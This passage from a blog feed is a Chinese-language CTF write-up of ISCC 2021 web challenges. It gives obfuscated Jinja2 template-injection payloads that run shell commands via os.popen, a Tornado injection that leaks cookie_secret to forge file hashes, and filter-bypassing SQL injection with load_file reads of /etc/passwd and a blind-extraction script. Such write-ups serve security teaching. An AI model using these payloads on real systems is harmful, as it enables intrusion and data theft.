class="hljs-variable">$new_iv</span> = <span class="hljs-variable">$new_iv</span> . chr(ord(<span class="hljs-variable">$iv</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$res</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$plaintext</span>[<span class="hljs-variable">$i</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$new_iv</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°æ–°çš„ivå€¼ä¼ è¿‡å»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">irk7Yy8%<span class="hljs-number">2</span>BiF%<span class="hljs-number">2</span>FBu1N2HvpoBw%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆflagä¸º<br><img src="https://img-blog.csdnimg.cn/20210513124157498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="lovely-ssti"><a href="#lovely-ssti" class="headerlink" title="lovely ssti"></a>lovely ssti</h2><p>Miao<del>Miao</del>Miao~è¿™é‡Œæœ‰ä¸€åªå¯çˆ±çš„æš¹ç½—çŒ«çŒ«<br>é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:3010/">http://39.96.91.106:3010/</a></p><p>æŸ¥çœ‹å¯ç”¨å­—ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?xiaodouni=&#123;%<span class="hljs-built_in">print</span>%20lipsum|select|string|list%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522174747622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ²¡åšè¿‡å¤šå°‘SSTIæ–¹é¢çš„é¢˜ï¼Œä¼šå•ç‹¬å¼„ç¯‡åšå®¢æ€»ç»“SSTIï¼Œæš‚æ—¶å…ˆè´´ä¸€ä¸‹å¤§å¸ˆå‚…ä»¬çš„Payloadå§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php">?xiaodouyu=<br>&#123;%set%<span class="hljs-number">20</span>xiahua=(config|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)[<span class="hljs-number">24</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gb=(xiahua,xiahua,dict(<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">a</span>)|<span class="hljs-title">join</span>,<span class="hljs-title">xiahua</span>,<span class="hljs-title">xiahua</span>)|<span class="hljs-title">join</span>%&#125;</span><br><span class="hljs-class"></span>&#123;%set%<span class="hljs-number">20</span>ini=(xiahua,xiahua,dict(init=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>glo=(xiahua,xiahua,dict(globals=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>oo=dict(o=a,s=a)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>so=oo[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>pp=dict(pop=a,ne=b)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>opo=pp[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>rd=(dict(read=a)|join)%&#125;<br>&#123;%<span class="hljs-keyword">print</span> config|attr(gb)|attr(ini)|attr(glo)|attr(gm)(so)|attr(opo)(<span class="hljs-string">&quot;cat /usr/?????is?here????&quot;</span>)|attr(rd)()%&#125;   <br><br><br>?xiaodouyu=<br>&#123;%set pp=(dict(pop=a))|join%&#125;<br>&#123;%set xiahua=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">24</span>)%&#125;<br>&#123;%set g=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">1</span>)%&#125;<br>&#123;%set gb=(xiahua,xiahua,g,dict(bals=a,lo=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set gm=(xiahua,xiahua,g,dict(e=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set chcr=(lipsum|attr(gb)|attr(gm)(bl))|attr(<span class="hljs-string">&quot;ge&quot;</span><span class="hljs-string">&quot;t&quot;</span>)(<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>)%&#125;<br>&#123;%set dian=chcr(<span class="hljs-number">46</span>)%&#125;<br>&#123;%set space=chcr(<span class="hljs-number">32</span>)%&#125;<br>&#123;%set xing=chcr(<span class="hljs-number">42</span>)%&#125;<br>&#123;%set shell=(<span class="hljs-string">&quot;cat &quot;</span>,<span class="hljs-string">&quot;requirements&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xing)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;cat /usr/fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xiahua,<span class="hljs-string">&quot;is&quot;</span>,xiahua,<span class="hljs-string">&quot;here&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;&#123; lipsum|attr(gb)|attr(gm)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell2)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br><br><br><br>?xiaodouyu=<br>&#123;% set xiahua=(config|<span class="hljs-keyword">string</span>)[<span class="hljs-number">14</span>]%&#125;<br>&#123;% set gb=(xiahua,xiahua,<span class="hljs-string">&quot;globals&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set bl=(xiahua,xiahua,<span class="hljs-string">&quot;builtins&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set cr=(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(bl))[<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>] %&#125;<br>&#123;% set dian=cr(<span class="hljs-number">46</span>)%&#125;<br>&#123;% set xing =cr(<span class="hljs-number">42</span>)%&#125;<br>&#123;% set shell=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fla&quot;</span>,xing)|join%&#125;<br>&#123;% set shell4 = <span class="hljs-string">&quot;cat /usr/fla??is?here?txt&quot;</span>%&#125;<br>&#123;&#123;(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell4))|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522173928909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="æ“‚å°"><a href="#æ“‚å°" class="headerlink" title="æ“‚å°"></a>æ“‚å°</h1><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p>Tornado æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<br>é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:7060/">http://39.96.91.106:7060</a></p><p>åœ¨BUUä¸Šåšè¿‡ï¼Œæ˜¯é“åŸé¢˜<br><img src="https://img-blog.csdnimg.cn/20210503130235264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä»ä¸‰ä¸ªé“¾æ¥å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li>flag.txtï¼šflagåœ¨/fllllllllllllaaaaaagæ–‡ä»¶é‡Œé¢</li><li>welcome.txtï¼šæ ¹æ®æç¤ºrenderï¼Œå¯ä»¥çŸ¥é“å­˜åœ¨æ¨¡æ¿æ³¨å…¥</li><li>hints.txtï¼šmd5(cookie_secret+md5(filename))</li></ol><p>å½“è®¿é—®/hints.txtï¼Œå‘ç°urlæ å˜ä¸ºï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15<br></code></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®fllllllllllllaaaaaagæ–‡ä»¶</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: /file?filename=/fllllllllllllaaaaaag<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503130631121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>éœ€è¦è®¡ç®—filehashçš„å€¼ï¼Œå³md5(cookie_secret+md5(filename))çš„å€¼ã€‚filenameå·²ç»çŸ¥é“äº†æ˜¯/fllllllllllllaaaaaagï¼Œä¸‹é¢éœ€è¦æ‰¾åˆ°cookie_secretã€‚</p><p>Tornadoæ¡†æ¶çš„é™„å±æ–‡ä»¶handler.settingsä¸­å­˜åœ¨cookie_secretï¼Œè¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payloadï¼šerror?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°cookie_secretçš„å€¼<br><img src="https://img-blog.csdnimg.cn/20210503130744591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥ä½¿ç”¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5() <br>    md5.update(s) <br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span> <br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(<span class="hljs-string">&quot;md5(filename): &quot;</span>+md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>    x=md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    y=cookie_secret+x<br>    print(<span class="hljs-string">&quot;md5(cookie_secret+md5(filename)): &quot;</span>+md5value(y.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br> <br> <br>jiami()<br><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5()<br>    md5.update(s.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span><br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(md5value(cookie_secret + md5value(filename)))<br><br>jiami()<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">md5(filename): 9395bd4a7a7cae3ce1f6dc17aeb2d2b8<br>md5(cookie_secret+md5(filename)): 1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆpayloadä¸º</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/fllllllllllllaaaaaag&amp;filehash=1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503131310534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>ç®€å•çš„web<br>é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:5001/">http://39.96.91.106:5001/</a><br>Flagæ ¼å¼ï¼šiscc{XXX}</p><p>æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--?id--&gt;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ä¸€ä¸‹ï¼Œid=1ï¼Œ2ï¼Œ3é¡µé¢å‡è¿”å›æ•°æ®ï¼Œå…¶å®ƒè¿”å›error</p><p>ä¸‡èƒ½å¯†ç <code>?id=1&#39; or 1=1#</code>ï¼Œè¿”å›die<br><img src="https://img-blog.csdnimg.cn/20210519163721103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œä½¿ç”¨<code>?id=1&#39;||1=1%23</code>æˆåŠŸè¿”å›æ•°æ®<br><img src="https://img-blog.csdnimg.cn/20210519163828121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†å¥½å¤š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">selectã€ unionã€ orã€ ord ã€ fromã€information_schemaã€ç©ºæ ¼ç­‰<br></code></pre></td></tr></table></figure><p>å¥½å¤šä»£æ›¿ç©ºæ ¼çš„éƒ½è¢«è¿‡æ»¤äº†ï¼Œä»…å‰©%0dæ²¡æœ‰è¿‡æ»¤<br>selectè¿‡æ»¤äº†ï¼Œä½¿ç”¨seselectlectåŒå†™ç»•è¿‡</p><p>å¾—åˆ°å›æ˜¾ä½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,2,3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:2</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>çˆ†åº“å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),version()%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_web</span><br><span class="hljs-string">#Your Password:5.7.33-0ubuntu0.16.04.1</span><br></code></pre></td></tr></table></figure><p>å‘ç°å½“å‰æ•°æ®åº“ç‰ˆæœ¬ä¸º5.7.33</p><p>æ¥ä¸‹æ¥å°±æ˜¯çˆ†è¡¨å</p><p>fromã€information_schemaéƒ½è¢«è¿‡æ»¤äº†ï¼ŒFROMå¤§å†™ç»•è¿‡ï¼Œå…³äºç»•è¿‡information_schemaå‚è€ƒ<a href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysqlæ³¨å…¥ç»•è¿‡information_schemaè¿‡æ»¤</a>ã€‚</p><p>å½“å‰æ•°æ®åº“ç‰ˆæœ¬ä¸º5.7ï¼Œå¯ç”¨<code>sys.schema_auto_increment_columns</code>ä»£æ›¿<code>information_schema</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFrom%0dsys.schema_auto_increment_columns),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_flag</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>çŒœæµ‹åˆ—åä¸ºflag,çˆ†å€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dFROM%0discc_flag),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:cccmd.php</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>è®¿é—®cccmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>       <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;die!!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$c</span>`;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!--flllllllllaaag.php--&gt;<br></code></pre></td></tr></table></figure><p>æ˜¾ç„¶flagåœ¨flllllllllaaag.phpä¸­ï¼Œé¦–å…ˆè¦çŸ¥é“å½“å‰è·¯å¾„ï¼Œæ‰§è¡Œpwdï¼Œå¾—åˆ°å½“å‰ç»å¯¹è·¯å¾„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/cccmd.php?c=<span class="hljs-built_in">pwd</span><br><span class="hljs-comment">#/var/www/const</span><br></code></pre></td></tr></table></figure><p>load_fileå‡½æ•°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå°è¯•è¯»å–<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/etc/passwd<span class="hljs-string">&#x27;)),3%23</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–<br><img src="https://img-blog.csdnimg.cn/20210519171130283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·¯å¾„çŸ¥é“äº†ï¼Œæ¥ä¸‹æ¥ç›´æ¥è¯»å–flllllllllaaag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/var/www/const/flllllllllaaag.php<span class="hljs-string">&#x27;)),3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#F12æŸ¥çœ‹æºç å¾—åˆ°&lt;?php$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>è´´ä¸€ä¸‹<a href="https://www.cnblogs.com/w0s1np/p/14782626.html">å¤§å¸ˆå‚…</a>çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://39.96.91.106:5001/?id=&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> (head &lt; tail):<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br><br>        payload = <span class="hljs-string">&quot;0%27||if(ascii(substr((seselectlect%0dhex(load_file(0x2f7661722f7777772f636f6e73742f666c6c6c6c6c6c6c6c6c616161672e706870))),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        r = requests.get(url + payload)<br>        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>        <span class="hljs-comment"># print(url+payload)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print(r.text)</span><br>            tail = mid<br><br>    last = result<br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(result)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E<br></code></pre></td></tr></table></figure><p>ç„¶åhexè½¬å­—ç¬¦ä¸²å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-string">&quot;3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E&quot;</span><br>s=<span class="hljs-built_in">bytes</span>.fromhex(m)<br>print(s)<br><br><span class="hljs-comment">#b&#x27;&lt;?php\r\n$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;;\r\n?&gt;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2021 MISC WP</title>
    <link href="/2021/05/26/ISCC2021-MISC-WP/"/>
    <url>/2021/05/26/ISCC2021-MISC-WP/</url>
    
